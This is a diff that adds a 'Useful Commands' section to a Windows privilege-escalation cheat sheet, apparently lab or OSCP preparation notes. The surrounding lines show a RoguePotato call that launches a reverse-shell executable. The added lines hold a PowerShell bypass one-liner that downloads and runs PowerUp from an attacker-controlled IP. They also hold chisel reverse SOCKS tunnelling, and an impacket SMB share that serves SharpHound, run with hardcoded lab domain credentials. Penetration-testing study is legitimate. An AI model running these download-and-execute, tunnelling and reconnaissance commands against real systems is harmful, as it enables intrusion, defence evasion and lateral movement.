@@ -345,6 +345,26 @@ Just another Windows Local Privilege Escalation from Service Account to System. 
 ```
 .\RoguePotato.exe -r 192.168.1.11 –l 9999 -e "C:\Windows\Temp\rev.exe
 ```
+
+## Useful Commands
+
+### PowerUp
+```
+powershell.exe -nop -exec bypass "IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.21:8000/PowerUp.ps1'); Invoke-AllChecks"
+```
+### Port Forwarding
+```
+chisel server -p 8000 --reverse
+chisel.exe client 10.10.14.3:8000 R:1337:socks
+socks5 127.0.0.1 1337
+proxychains4 nmap 127.0.0.1 -p 8888
+```
+### BloodHound
+```
+impacket-smbserver test $(pwd)
+
+powershell -ep bypass -command "import-module \\10.10.14.7\test\SharpHound.ps1; invoke-bloodhound -collectionmethod all -domain htb.local -ldapuser svc-alfresco -ldappass s3rvice"
+```
 --- 
 
 Reference: https://redtm.com/docs/privilege-escalation/2020-07-privilege-escalation/windows-privilege-escalation-cheatsheet-for-oscp/
